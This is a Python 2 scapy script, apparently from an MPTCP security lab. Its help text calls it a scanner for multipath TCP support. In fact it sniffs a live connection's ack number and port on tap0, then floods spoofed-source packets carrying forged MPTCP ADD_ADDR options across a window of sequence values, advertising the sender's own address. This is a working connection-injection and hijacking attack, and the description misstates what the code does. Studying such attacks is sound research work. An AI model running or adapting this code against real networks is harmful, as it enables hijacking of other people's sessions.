import logging
logging.getLogger("scapy.runtime").setLevel(logging.DEBUG)

from scapy.all import *
from scapy.layers.inet import TCP, IP, Neighbor
from scapy.layers import mptcp
from scapy.sendrecv import sr1
import random
from scapy.all import sr1
from netaddr import *
import netaddr
from sniff_script import getAck, getPorts

#TODO: add the ability to scan checksum support
#TODO: add the ability to scan HMAC or other auth support
#TODO: add the ability to test MP_Join through networks, maybe via different interfaces?
#TODO: Consider porting over the ability to do tracebox-like failure analysis
#TODO: Add optional host-up checks
#TODO: Change target IPs to plain targets (to allow for dns entries)
#TODO: Make sure all params are consistently ordered and named throughout
#TODO: add address/port randomisation (modulus ringbuffers)

#From mptcptestlib
def randintb(n):
    """Picks a n-bits value at random"""
    return random.randrange(0, 1L<<(n-1))

#From mptcptestlib
def getMpOption(tcp):
    """Return a generator of mptcp options from a scapy TCP() object"""
    for opt in tcp.options:
        if opt.kind == 30:
            yield opt.mptcp

#From mptcptestlib
def getMpSubkind(pkt, kind):
    """Return a generator of mptcp kind suboptions from pkt"""
    l4 = pkt.getlayer("TCP")
    for o in getMpOption(l4):
        if MPTCP_subtypes[o.subtype] == kind:
            yield (l4, o)

def makeMPAddAddr(sourceAddr,sport,dstAddr,dport,initTCPSeq):

    if sport is None: sport = randintb(16)
    if initTCPSeq is None: initTCPSeq = randintb(32)
    print initTCPSeq
    pkt = (IP(version=4L,src=sourceAddr,dst=dstAddr)/        \
        TCP(sport=sport,dport=dport,flags="A",seq=1,ack=initTCPSeq, \
        options=[TCPOption_MP(mptcp=MPTCP_AddAddr(
                            address_id=5,
                            adv_addr=get_local_ip_address(dstAddr)))]))
    #print pkt.show()
    return pkt


def defaultScan(sniffAck,sniffPort):
    timeout=5

    dstIP = "10.1.1.2"
    srcIP = "10.2.1.2"
    srcPort = 5001

    gatewayIP = Route().route(str(dstIP))[2]
    if gatewayIP == '0.0.0.0':
        print "... on local network...",
        arpadd = getmacbyip(str(dstIP))
        if arpadd == None:
            print " not got MAC, skipping"
            return
        if arpadd == "ff:ff:ff:ff:ff:ff":
            print "This appears to be localhost?"
        else:
            print " at ARP:", arpadd
    else:
        print "Via", gatewayIP, " Not on local network"

    response = []
    pk_list = []
    seq = sniffAck
    while seq < sniffAck + 100000:
        if seq % 100000 == 0:
            print seq
        pk_list.append(makeMPAddAddr(srcIP,srcPort,dstIP,sniffPort,seq))
        seq += 1427
    response.append(sr1(pk_list,timeout=timeout, verbose=True))
    for element in response:
        if element is None:
            pass
        else:
            element.show()
    return

def parse_args():
    import argparse
    import itertools
    import sys

    parser = argparse.ArgumentParser(description='Network scanner to test hosts for multipath TCP support. Requires root privileges for scapy.')
    parser.add_argument('port', action="store",
                        help='dstPort')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()
    return int(args.port)


def get_local_ip_address(target):
    """Return the the IP address suitable for the target (ip or host)

    This appears to be the best cross platform approach using only
    the standard lib. Better ideas welcome.
    """
    #TODO: handle err if no suitable IP
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((str(target), 8000))
    ipaddr = s.getsockname()[0]
    s.close()
    return ipaddr


def main():
    portList = getPorts('tap0')
    dstPort = 0
    if portList[0] == 5001:
        dstPort = portList[1]
    else:
        dstPort = portList[0]
    defaultScan(getAck('tap0'),dstPort)

if __name__ == "__main__":
    main()
# vim: set ts=4 sts=4 sw=4 et:
